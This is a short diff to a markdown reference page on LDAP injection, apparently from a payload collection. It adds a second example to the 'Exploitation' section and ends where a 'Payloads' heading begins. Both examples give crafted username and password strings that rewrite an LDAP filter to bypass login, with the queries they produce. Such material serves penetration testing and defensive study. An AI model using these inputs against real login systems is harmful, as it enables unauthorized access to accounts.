@@ -2,11 +2,20 @@
 LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.
 
 ## Exploitation
+Example 1.
 ```
 user  = *)(uid=*))(|(uid=*
 pass  = password
 query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
 ```
+
+Example 2
+```
+user  = admin)(!(&(1=0
+pass  = q))
+query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
+```
+
 
 ## Payloads
 ```
